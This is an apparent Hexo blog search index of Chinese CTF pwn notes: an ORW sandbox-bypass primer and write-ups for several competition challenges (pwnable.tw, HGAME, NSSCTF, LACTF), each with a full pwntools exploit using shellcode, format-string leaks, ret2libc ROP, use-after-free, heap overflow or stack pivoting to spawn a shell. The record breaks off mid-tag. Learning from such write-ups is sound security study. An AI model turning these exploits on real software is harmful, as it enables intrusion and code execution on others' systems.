<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>orw笔记(持续更新)</title>
      <link href="/2024/02/21/orw/"/>
      <url>/2024/02/21/orw/</url>
      
        <content type="html"><![CDATA[<h1 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h1><h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>orw禁用了系统调用，采用了沙箱技术开启了沙箱保护，我们不能正常的get shell，只能用ROP链来调用其他的函数，这时候需要通过调用open、read、write这样的函数打开flag</p><h2 id="沙箱函数"><a href="#沙箱函数" class="headerlink" title="沙箱函数"></a>沙箱函数</h2><p>原始的沙箱都是使用prctl()函数进行,所以能看见这个函数的时候一般都有开了沙箱</p><p><code>**prctl** ( int **option**,unsigned long arg2,unsigned long arg3,unsigned long arg4,unsigned long arg5 )</code></p><h2 id="查看沙箱"><a href="#查看沙箱" class="headerlink" title="查看沙箱"></a>查看沙箱</h2><p>可以通过<code>seccomp-tools</code>来判断是否添加沙箱，以及查看沙箱的规则</p><h3 id="seccomp-tools的安装"><a href="#seccomp-tools的安装" class="headerlink" title="seccomp-tools的安装"></a>seccomp-tools的安装</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ sudo apt install gcc ruby-dev$ gem install seccomp-tools<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="seccomp-tools的使用"><a href="#seccomp-tools的使用" class="headerlink" title="seccomp-tools的使用"></a>seccomp-tools的使用</h2><p><code>seccomp-tools dump ./pwn</code></p><h2 id="mmap"><a href="#mmap" class="headerlink" title="mmap()"></a>mmap()</h2><p>一般来说，orw这种类型的题都会有一个mmap函数来改写一个地址的读写权限，我们需要利用这块地址来构造ROP链。</p><p><code>void *mmap (void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></p><h2 id="shellcode绕过"><a href="#shellcode绕过" class="headerlink" title="shellcode绕过"></a>shellcode绕过</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>没有开启NX保护的时候，可以让程序执行自己输入的指令直接调用orw三个系统调用(x86下的shellcode,x64需要修改一下寄存器)</p><pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">#fd = open('/home/orw/flag',0) s = ''' xor edx,edx; mov ecx,0; mov ebx,0x804a094; mov eax,5; int 0x80; '''#read(fd,0x804a094,0x20) s = ''' mov edx,0x40; mov ecx,ebx; mov ebx,eax; mov eax,3; int 0x80; '''#write(1,0x804a094,0x20) s = ''' mov edx,0x40; mov ebx,1; mov eax,4 int 0x80; '''<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="ROP绕过"><a href="#ROP绕过" class="headerlink" title="ROP绕过"></a>ROP绕过</h2><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>开启NX保护的题目，无法执行shellcode，需要通过ROP来调用orw的三个函数</p><h3 id="pwnable-tw-orw"><a href="#pwnable-tw-orw" class="headerlink" title="pwnable.tw orw"></a>pwnable.tw orw</h3><p>先checksec一下</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.1.png"></p><p>看一下函数逻辑</p><p><img src="/2024/02/21/orw/pwnable.tw.orw.2.png"></p><p><img src="/2024/02/21/orw/pwnable.tw.orw.3.png"></p><p>先是orw_seccomp限定了orw，然后hint用shellcode过去</p><p>那么写exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os="linux", arch="i386", log_level="debug")bss = 0x0804A040#p = process('./orw')p = remote('chall.pwnable.tw',10001)p.recvuntil('shellcode:')#openshellcode = asm("xor ebx,ebx;xor ecx,ecx;xor edx,edx;xor eax,eax;push ebx ;push 0x67616c66 ;push 0x2f77726f ;push 0x2f656d6f ;push 0x682f2f2f ;mov ebx,esp;mov al,0x5;int 0x80;")#readshellcode += asm("mov ebx,0x3;mov ecx,esp ;mov edx,0x40;xor eax,eax;mov al,0x3;int 0x80;")#writeshellcode += asm("mov ebx,0x1;xor eax,eax ;mov al,0x4;int 0x80;")p.sendline(shellcode)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/21/orw/pwnable.tw.orw.4.png"></p><h2 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h2><h3 id="signal-机制"><a href="#signal-机制" class="headerlink" title="signal 机制"></a>signal 机制</h3><p>signal 机制是类 unix 系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用 kill 来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p><p><img src="/2024/02/21/orw/SROP%E4%BF%A1%E5%8F%B7.png"></p><p>内核向某个进程发送 signal 机制，该进程会被暂时挂起，进入内核态。</p><p>内核会为该进程保存相应的上下文，主要是将所有寄存器压入栈中，以及压入 signal 信息，以及指向 sigreturn 的系统调用地址。此时栈的结构如下图所示，我们称 ucontext 以及 siginfo 这一段为 Signal Frame。</p><p>需要注意的是，这一部分是在用户进程的地址空间的。</p><p>之后会跳转到注册过的 signal handler 中处理相应的 signal。因此，当 signal handler 执行完之后，就会执行 sigreturn 代码。</p><p>我的理解是，触发信号之后会进入内核然后寄存器压栈，然后准备sigreturn的调用。</p><p><img src="/2024/02/21/orw/SROP%E6%A0%88%E7%BB%93%E6%9E%84.png"></p><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><p>如果我们伪造栈上的进程上下文再直接调用sigreturn系统调用，就能通过伪造的进程上下文中的各种寄存器随意设置寄存器、跳转任意地址</p><h2 id="利用set-context"><a href="#利用set-context" class="headerlink" title="利用set_context"></a>利用set_context</h2><p>(下面还没学，学完之后更新)</p><h2 id="FSOP"><a href="#FSOP" class="headerlink" title="FSOP"></a>FSOP</h2><p>禁用free_hook则打malloc_hook</p><h2 id="House-of-KIWI"><a href="#House-of-KIWI" class="headerlink" title="House of KIWI"></a>House of KIWI</h2><p>参考博客：<a href="https://www.cnblogs.com/fuxuqiannian/p/17144953.html">https://www.cnblogs.com/fuxuqiannian/p/17144953.html</a></p><p><a href="https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/">https://x1ng.top/2021/10/28/pwn-orw%E6%80%BB%E7%BB%93/</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2">https://ctf-wiki.org/pwn/linux/user-mode/stackoverflow/x86/advanced-rop/srop/#_2</a></p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> orw </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024.2.9</title>
      <link href="/2024/02/21/2024-2-9/"/>
      <url>/2024/02/21/2024-2-9/</url>
      
        <content type="html"><![CDATA[<h1 id="ff"><a href="#ff" class="headerlink" title="ff"></a>ff</h1><p>开了pie和canary的一道题，还有格式化字符串漏洞，用格式化字符串找到canary，然后利用当前程序的地址算出基址破解pie</p><p>先计算字符串的偏移，一般canary的后两位是00，算出canary的偏移在17,下一个程序在后两个，第19</p><p><img src="/2024/02/21/2024-2-9/ff.1.png"></p><p>因为要计算基址，先找到第19位程序的后四位地址再计算</p><p><img src="/2024/02/21/2024-2-9/ff.2.png"></p><p>然后找到后门函数位置</p><p><img src="/2024/02/21/2024-2-9/ff.3.png"></p><p>找到canary的偏移</p><p><img src="/2024/02/21/2024-2-9/ff.4.png"></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os="linux", arch="amd64", log_level="debug")p = process("./ff")p.sendline(b"%17$p-%19$p")p.recvuntil("0x")canary = int(p.recv(16),16)ret = int(p.recv(15)[3:],16)base = ret - 0x146Fcat = base + 0x1231payload = b'a' * 56 + p64(canary) + p64(0) + p64(cat)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/21/2024-2-9/ff.5.png"></p><p>(因为没自己写flag所以cat不到)</p>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Week 2</title>
      <link href="/2024/02/06/week%202/"/>
      <url>/2024/02/06/week%202/</url>
      
        <content type="html"><![CDATA[<h1 id="HGAME-PWN"><a href="#HGAME-PWN" class="headerlink" title="HGAME PWN"></a>HGAME PWN</h1><h2 id="ezshellcode"><a href="#ezshellcode" class="headerlink" title="ezshellcode"></a>ezshellcode</h2><p>存在整数溢出，unsigned v4,输入-1，然后给一个shellcode</p><p>找一个shellcode放里面</p><p>shellcode来源：<a href="https://blog.csdn.net/mcmuyanga/article/details/114828207">https://blog.csdn.net/mcmuyanga/article/details/114828207</a></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import*context(log_level='debug',arch='amd64',os='linux')p=process('./ezshellcode')p.sendlineafter("of your shellcode:",b'-1')shellcode=b"Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t"p.sendafter("input your shellcode:",shellcode)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Elden-Random-Challenge"><a href="#Elden-Random-Challenge" class="headerlink" title="Elden Random Challenge"></a>Elden Random Challenge</h2><p>猜中99个随机数之后有个read的栈溢出，然后就是基础的ret2libc</p><p>使用ctypes调用链接库的函数，通过创建cdll.LoadLibary来找出随机数</p><p>进入myread函数之后通过read函数与动态链接库，写一个ret2libc</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from ctypes import *context(log_level='debug',os='linux',arch='amd64',terminal=['tmux','splitw','-h'])p = remote('106.14.57.14',30931)elf = ELF('./vuln')libc = cdll.LoadLibrary('./libc.so.6')libc.srand(0)  #找种子p.sendafter("thy name", b'a' * 0x12)for i in range(0,99):    m = libc.rand()%100+1    # print(m)    p.sendafter("guess the number:",p64(m))     libc = ELF('./libc.so.6')puts_got = elf.got['puts']puts_plt = elf.plt['puts']pop_rdi = 0x401423ret = 0x40101Aread = 0x401250 payload=b'a'*0x38payload+=p64(pop_rdi)payload+=p64(puts_got)payload+=p64(puts_plt)payload+=p64(read)p.sendafter("thy brilliant mind.",payload)libc_base=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))-libc.sym['puts']                 # print("libc_base=",hex(libc_base))payload=b'a'*0x38payload+=p64(ret)payload+=p64(pop_rdi)payload+=p64(libc_base+next(libc.search(b'/bin/sh')))payload+=p64(libc_base+libc.sym['system'])p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="CISCN-2019西南-PWN1"><a href="#CISCN-2019西南-PWN1" class="headerlink" title="[CISCN 2019西南]PWN1"></a>[CISCN 2019西南]PWN1</h1><p>hgame的fmt没打通，就又找了一道格式化字符串的题</p><p>先gdb动调计算出偏移量4，找libc中的printf的got表，system的plt，加上个主函数</p><p>修改fini，重新走一遍程序，使用fmtstr把system换上去</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(log_level='debug',arch='i386', os='linux')p = process('./pwn')elf = ELF(pwn)#rop = ROP(pwn)libc =elf.libcio.recvuntil(b"your name?\n")fini = 0x0804979C  system_addr = elf.plt['system']printf_addr = elf.got['printf']main = elf.symbols['main']payload = fmtstr_payload(4, {fini :main , printf_addr:system_addr},write_size='short')#write_size有int short 跟byteprint(payload)io.sendline(payload)io.recvuntil(b"What's your name?\n")io.sendline(b'/bin/sh\x00')io.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷题记录</title>
      <link href="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
      <url>/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<h1 id="刷题记录"><a href="#刷题记录" class="headerlink" title="刷题记录"></a>刷题记录</h1><h2 id="SWPUCTF-2022-新生赛-Integer-Overflow"><a href="#SWPUCTF-2022-新生赛-Integer-Overflow" class="headerlink" title="[SWPUCTF 2022 新生赛]Integer Overflow"></a>[SWPUCTF 2022 新生赛]Integer Overflow</h2><p>一道普通的libc,但是需要注意不能使用elf.sym来寻找system的地址，因为<code>endbr32</code>会保护plt表</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BSWPUCTF%202022%20%E6%96%B0%E7%94%9F%E8%B5%9B%5DInteger%20Overflow.1.png"></p><p>所以我们顺着程序逻辑走之后栈溢出即可</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(log_level='debug',arch='i386', os='linux')p = remote('node5.anna.nssctf.cn',28462 )elf = ELF('./pwn')system = 0x08049104sh= 0x804a008p.sendlineafter('Tell me your choice:','1')p.sendlineafter('First input the length of your name:','-1')payload = flat([b'a'* (0x20 + 0x4) , system , 1, sh])p.sendlineafter(b"name?",payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="NISACTF-2022-UAF"><a href="#NISACTF-2022-UAF" class="headerlink" title="[NISACTF 2022]UAF"></a>[NISACTF 2022]UAF</h2><p>(第一次尝试uaf题)</p><h3 id="uaf原理"><a href="#uaf原理" class="headerlink" title="uaf原理"></a>uaf原理</h3><p>user-after-free漏洞是因为没有合理使用动态内存，在数据已经被删除或移动后原先的指针还被保留。指针本质上是内存地址和数据的一种对应关系，如果只处理了数据但是没有处理这种对应关系的话，就像你家被盗是因为上一个主人走后没换锁，别人拿着老的那把锁还能开你家的门。</p><p>程序的动态内存设计heap(堆)，可以在一定范围内分配大量数据并且相对来说比较自由，可以修改、释放或者再程序的其他部分自由使用。当然在使用中要动态查找哪一个部分是有空缺的。</p><p>``</p><p>先看代码逻辑，应该是最简单的uaf了，只需要完成四个步骤然后找到<code>NICO</code>即可</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.1.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.2.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.3.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF4.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.5.png"><br><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.6.png"></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux', arch='i386', log_level='debug')# p = process(['./pwn'])p = remote('node4.anna.nssctf.cn', 28004)elf = ELF('./pwn')def create_page():    p.sendlineafter(b':', b'1')def delete_page(index):    p.sendlineafter(b':', b'3')    p.sendlineafter(b'Input page\n', str(index))def edit_page(index, content):    p.sendlineafter(b':', b'2')    p.sendlineafter(b'Input page\n', str(index))    p.sendlineafter(b'Input your strings\n', content)def show_page(index):    p.sendlineafter(b':', b'4')    p.sendlineafter(b'Input page\n', str(index))# create page 0create_page()# delete page 0delete_page(0) # create page 1create_page()# edit page -&gt; uafpayload = flat(['sh\x00\x00', elf.sym['NICO']])edit_page(1, payload)# show page 0show_page(0)# 利用 show 功能 get_shell 的时候只能使用索引为 0 的堆块，而 edit 不能编辑索引为 0 的堆块，所以就要用到 UAF 了p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5DUAF.7.png"></p><h2 id="CISCN-华南-PWN4"><a href="#CISCN-华南-PWN4" class="headerlink" title="CISCN 华南 PWN4"></a>CISCN 华南 PWN4</h2><p>本题为32位栈迁移</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CISCN%20%E5%8D%8E%E5%8D%97%20PWN4.1.png"></p><p>看到<code>read</code>和<code>printf</code>想到格式化字符串漏洞</p><p>因为是32位程序，用栈传递参数，所以找到esp位置，传入system的地址和/bin/sh后再从栈上退回即可实现提权</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')p=remote('node5.anna.nssctf.cn',28355)elf=ELF('./pwn2')system_addr=elf.sym['system']leave_addr=0x80485FDpayload1 = b'a'*0x27p.sendlineafter('name?\n',payload1)p.recvuntil('\n')esp = u32(p.recv(4))-0x38payload2 = b'a'*4+p32(system_addr)+p32(0)+p32(esp+0x10)+b'/bin/sh'payload2 = payload2.ljust(0x28,b'\0')payload2+=p32(esp)+p32(leave_addr)p.sendlineafter('\n',payload2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/CISCN%20%E5%8D%8E%E5%8D%97%20PWN4.2.png"></p><h2 id="HGAME-2023-week1-simple-shellcode"><a href="#HGAME-2023-week1-simple-shellcode" class="headerlink" title="[HGAME 2023 week1]simple_shellcode"></a>[HGAME 2023 week1]simple_shellcode</h2><p>打开ida可以发现<code>MEMORY[0xCAFE0000]</code>,根据hint调用read来读取flag,而<code>read</code>的范围比较小，手动扩大范围即可</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHGAME%202023%20week1%5Dsimple_shellcode.2.jpg"></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux', arch='amd64', log_level='debug')p=remote('node5.anna.nssctf.cn',28430)#p=process("./shellcode")p.recvuntil("shellcode:\n") mmap_addr =0xcafe0000 shellcode=shellcraft.open("./flag")shellcode+=shellcraft.read(3,mmap_addr+0x100,0x50)shellcode+=shellcraft.write(1,mmap_addr+0x100,0x50)shellcode=asm(shellcode) p.send(asm("xor rdi,rdi;mov rsi,0xcafe000f;syscall;"))# 将rdi置零后把read的调用放里面#print(len(asm("xor rdi,rdi;mov rsi,0xcafe000f;syscall;")))#查看扩展的范围是否足够 p.send(shellcode)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHGAME%202023%20week1%5Dsimple_shellcode.1.jpg"></p><h2 id="NISACTF-2022-ezheap"><a href="#NISACTF-2022-ezheap" class="headerlink" title="[NISACTF 2022]ezheap"></a>[NISACTF 2022]ezheap</h2><p>首先代码看一下，就是简单的malloc个heap空间，直接分配堆空间然后堆溢出即可</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.2.jpg"></p><p>先随便输入一些数据，然后gdb调试一下发现heap是0x20，但是我们申请的是0x16，这是为什么呢？这是因为malloc_chunk要求chunk大小必须是 2 * SIZE_SZ 的整数倍，如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。而在32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。题目程序为32位，我们申请了0x16(22)个字节，再加上chunk header（也就是prev_size和size）的4<em>2=8个字节，一共22+8=30个字节，不是2</em>4=8的倍数，所以补齐到32个字节，也就是0x20</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.1.jpg"></p><p>附图：</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.3.png"></p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BNISACTF%202022%5Dezheap.4.jpg"></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(log_level="debug",arch="amd64")# p = remote("node4.anna.nssctf.cn",28184)p = process("./../pwn")elf = ELF("./../pwn")p.recvuntil("Input:\n")#0x20为整个chunk的大小，减去0x8（也就是prev_size和size）就是剩下的userdata，加上0x8（也就是下一个chunk的prev_size和size），这样就到达了下一个chunk的userdata部分，输入命令就行了。payload = b'A' * (0x20-0x8 + 0x8) + b'/bin/sh'  p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="HNCTF-2022-WEEK4-ezheap"><a href="#HNCTF-2022-WEEK4-ezheap" class="headerlink" title="[HNCTF 2022 WEEK4]ezheap"></a>[HNCTF 2022 WEEK4]ezheap</h2><p>是一道heap的模板题，通过adse几个功能实现对堆上的操作</p><p>因为程序中有puts函数，泄露出函数的偏移和基地址，再去使用libc库中的system函数实现提权，获取shell</p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *context(os='linux',arch='amd64',log_level='debug')#p = process('./pwn')p = remote("node5.anna.nssctf.cn",28668)elf = ELF('./pwn')libc = ELF('./libc-2.23.so')def lg(x, y): return log.success(f'{x}: {hex(y)}')def choice(index):    p.sendlineafter(b'Choice: \n', str(index).encode())def add(index, size, name, content):    choice(1)    p.sendlineafter(b'idx:\n', str(index).encode())    p.sendlineafter(b'Size:\n', str(size).encode())    p.sendlineafter(b'Name: \n', name)    p.sendlineafter(b'Content:\n', content)def edit(index, size, data):    choice(4)    p.sendlineafter(b'idx:\n', str(index).encode())    p.sendlineafter(b'Size:\n', str(size).encode())    p.send(data)def free(index):    choice(2)    p.sendlineafter(b'idx:\n', str(index).encode())def show(index):    choice(3)    p.sendlineafter(b'idx:\n', str(index).encode())add(0, 0x10, b'00000000', b'AAAAAAAA')add(1, 0x10, b'11111111', b'BBBBBBBB')payload = b"CCCCCCCC"*8edit(0, 0x40, payload)show(0)p.recvuntil(b"CCCCCCCC"*8)puts_addr = u64(p.recvuntil(b"\x7f").ljust(8,b"\x00"))lg("puts_addr: ", puts_addr)libc_base = puts_addr - libc.sym['puts']binsh = libc_base + libc.search(b'/bin/sh').__next__()system = libc_base + libc.sym['system']lg("binsh: ", binsh)lg("system: ", system)payload = b"DDDDDDDD"*4payload += b"/bin/sh\x00"payload += p64(0)payload += b"DDDDDDDD"*2payload += p64(system)payload += p64(0)edit(0, 0x60, payload)show(1)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BHNCTF%202022%20WEEK4%5Dezheap.1.png"></p><h2 id="LACTF-2024-sus"><a href="#LACTF-2024-sus" class="headerlink" title="LACTF 2024 sus"></a>LACTF 2024 sus</h2><p>一道libc题，找出偏移量之后泄露puts地址，然后算基地址偏移，找system函数和/bin/sh字串位置(压缩包里的libc库有点问题，自己找了个2.35的换一下)</p><p>无法直接传参进入rdi，找个汇编片段间接传参</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LACTF%20sus.2.png"></p><p>exp:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *from LibcSearcher import *context(os="linux", arch="amd64", log_level="debug")p = process('./sus')elf = ELF('./sus')libc = ELF('./libc.so.6')puts_plt = 0x401030puts_got = 0x404000main_addr = 0x401151pop_rdi_ret = 0x401190ret = 0x401016payload = b'a'*56 + p64(puts_got) + p64(0) + p64(puts_plt) + p64(main_addr)p.sendlineafter("sus?\n",payload)puts_addr=u64(p.recvuntil("\x7f")[-6:].ljust(8,b'\x00'))print(hex(puts_addr))libc_base = puts_addr - libc.symbols['puts']system_addr = libc_base + libc.symbols['system']bin_addr = libc_base + next(libc.search(b'/bin/sh'))print("base = ",hex(libc_base))print("sys = ",hex(system_addr))print("bin = ",hex(bin_addr))payload = b'b'*56 + p64(bin_addr) + p64(0) + p64(ret)+ p64(system_addr)p.sendline(payload)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/LACTF%20sus.1.png"></p><h2 id="LitCTF-2023-狠狠的溢出涅"><a href="#LitCTF-2023-狠狠的溢出涅" class="headerlink" title="[LitCTF 2023]狠狠的溢出涅~"></a>[LitCTF 2023]狠狠的溢出涅~</h2><p>一道ret2libc模板题，只需要泄露puts函数的got表后找偏移，ropgadget找个ret，剩下的都在链接库里，比较简单</p><p>只需要注意一下strlen函数的<code>\x00</code>绕过即可</p><p><img src="/2024/02/06/%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%5BLitCTF%202023%5D%E7%8B%A0%E7%8B%A0%E7%9A%84%E6%BA%A2%E5%87%BA%E6%B6%85~.2.png"></p><p>exp:</p><pre class="line-numbers language-none"><code class="language-none">from pwn import *from LibcSearcher import *context(os="linux", arch="amd64", log_level="debug")#p = process('./pwn')p = remote('node4.anna.nssctf.cn',28190)elf = ELF('./pwn')libc = ELF('./libc-2.31.so')pop_rdi_ret = 0x4007d3 puts_got = elf.got['puts']puts_plt = elf.plt['puts']ret_addr = 0x400556 main_add = elf.sym['main']#b"\x00".ljust(0x68,b'a')payload1 = b'\x00'*(0x60+8) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(main_add)p.sendlineafter("message:\n",payload1)puts_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))libc_base = puts_addr - libc.sym["puts"]system = libc_base + libc.symbols['system']binsh = libc_base+next(libc.search(b"/bin/sh\x00"))print(hex(puts_addr))print(hex(system))print(hex(binsh))payload2 = b'\x00'*(0x60+8) + p64(ret_addr) + p64(pop_rdi_ret) +p64(binsh) + p64(system)p.sendlineafter('message:\n',payload2)p.interactive()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img 